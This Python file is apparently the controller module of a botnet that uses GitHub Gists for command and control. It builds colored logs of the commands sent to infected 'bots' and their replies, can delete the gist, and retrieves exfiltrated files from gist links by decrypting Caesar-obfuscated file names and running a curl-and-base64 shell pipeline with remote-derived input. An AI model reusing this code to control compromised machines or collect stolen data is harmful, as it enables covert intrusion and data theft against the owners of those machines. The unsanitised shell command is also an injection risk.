from api_wrapper import get_gist_id_from_description, get_comments, delete_gist
from utils import caesar_decrypt
from urllib import parse as url_parse
from datetime import datetime
from termcolor import colored
from utils import link
import os
import re
import subprocess
import steganography


def generate_log(gist_id, bot):
    """The log will be shown in the following format:

    [05/01/2023 16:04:02] controller@cctools:~$ exec "/usr/bin/ps"
      |
      |__ [05/01/2023 16:09:35] humongus_whale@botnet:~ /usr/bin/ps

          PID TTY          TIME CMD
  47033 pts/0    00:00:00 bash
  47082 pts/0    00:00:00 ps

    [05/01/2023 16:04:02] controller@cctools:~$ w
      |
      |__ [05/01/2023 16:09:35] humongus_whale@botnet:~ w

 15:21:27 up 83 days, 23:30,  1 user,  load average: 6.08, 5.87, 6.39
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/0    147.32.96.61     15:15    0.00s  0.03s  0.00s w
    """

    log = ""
    # We have to group the comments by the command sent and the answer of the bot
    comments = sorted(get_comments(gist_id),
                      key=lambda x: x["updated_at"])

    i = 0
    step = 2

    # We iterate every 2 because we want to group the command and the answer
    while i < len(comments):
        command = comments[i]
        command_date = datetime.strptime(
            command['created_at'], '%Y-%m-%dT%H:%M:%SZ').strftime('[%d/%m/%Y %H:%M:%S]')

        # Remove the "✅ ", "❌ " or "⏱️ " from the command
        command_body = command['body'][2:].strip()
        command_host = "controller@cctools:~$"

        answer = comments[i + 1] if (i + 1) < len(comments) else None
        is_answer = answer and answer['body'].startswith(">")
        has_errors = answer and answer['body'].startswith("> ❌")

        # True means that the file has to be decoded from base64
        has_file = is_answer and "📎" in answer['body']

        # If there are 30 comments and i=29, it wouldn't show the last comment with answer properly
        # We fix it by going back one comment to process 28 and 29 together
        if (not is_answer and (i + 1 == len(comments)) and any(comments['body'].startswith(">") for comments in comments[i:])):
            i -= 1
            continue

        if is_answer:
            answer_date = datetime.strptime(
                answer['updated_at'], '%Y-%m-%dT%H:%M:%SZ').strftime('[%d/%m/%Y %H:%M:%S]')
            answer_host = bot['name'] + '@botnet:~$'
            # remove the quoted message from the reply
            answer_body = answer['body'].split("\r\n\r\n")[1]
            if has_file:
                # The string is of the following type:
                # 📎 [file.pcap](https://gist.githubusercontent.com/andrsdt/c2f1f0e780f29cadd6c493cd393bcec1/raw/6251fa430f742bacbdaf9a38538ca65b0e5b13a1/file.pcap)
                # We want to get the link using regex's lookahead and lookbehind
                remote_link = re.findall(r"(?<=\]\().*(?=\))", answer_body)[0]

                bot_folder = f"../data/{bot['name']}"
                # URL is encoded as %F0%9F%91%93%F0%9F%91...
                file_name_url_encoded = remote_link.split('/')[-1]
                file_name_encoded = url_parse.unquote(file_name_url_encoded)
                file_name = caesar_decrypt(
                    file_name_encoded, steganography.caesar_constant)
                file_path = f"{bot_folder}/{file_name}"

                if not os.path.exists(bot_folder):
                    os.makedirs(bot_folder)

                if not os.path.exists(file_path):

                    # We download the content from the link and revert it from base64.
                    subprocess.run(
                        f"curl -s {remote_link} | base64 -d > {file_path} ", shell=True)

                # Then save it in a file with the same name as the original file
                answer_body = "📎 File saved in " + \
                    link(os.path.abspath(file_path))

        else:
            # If the answer doesn't start with ">", it means that the bot hasn't reply to the command yet
            # This way this command gets processed again but as a question in the next iteration
            i -= 1
            answer_date = "[--/--/---- --:--:--]"
            answer_host = bot['name'] + '@botnet:~$'
            answer_body = ""

        # Coloring the log
        body_color = 'red' if has_errors else 'white'

        command_date = colored(command_date, 'yellow')
        command_host = colored(command_host, 'green', attrs=['bold'])
        command_body = colored(command_body, 'light_green')

        tree_separator = colored('\t┬\n\t└──', 'cyan')

        answer_date = colored(answer_date, 'cyan')
        answer_host = colored(answer_host, 'green', attrs=['bold'])
        answer_body = colored(answer_body, body_color)

        log += f"{command_date} {command_host} {command_body}\n"
        log += f"{tree_separator} {answer_date} {answer_host} {command_body if is_answer else '(Not answered yet)'}\n\n{answer_body}\n"

        i += step  # Step 2 because we want to group the command and the answer

    return log


def get_command_log(bot):
    os.system("clear")
    humanized_name = bot["name"].replace("_", " ").title()
    gist_id = get_gist_id_from_description(humanized_name) or None

    print(f"\n\n{generate_log(gist_id, bot)}" if gist_id else "There has not been interaction with this bot yet")

    try:
        input(
            "Press enter to refresh. Press Ctrl+C to go back to the main menu.")
        get_command_log(bot)
    except KeyboardInterrupt:
        return


def clear_command_log(bot):
    os.system("clear")
    humanized_name = bot["name"].replace("_", " ").title()
    gist_id = get_gist_id_from_description(humanized_name) or None

    if gist_id:
        delete_gist(gist_id)
        print(f"The log for {humanized_name} has been cleared.\n")
    else:
        print("There has not been interaction with this bot yet.\n")

    try:
        input("Press enter or CTRL+C to go back to the main menu.")
    except KeyboardInterrupt:
        return
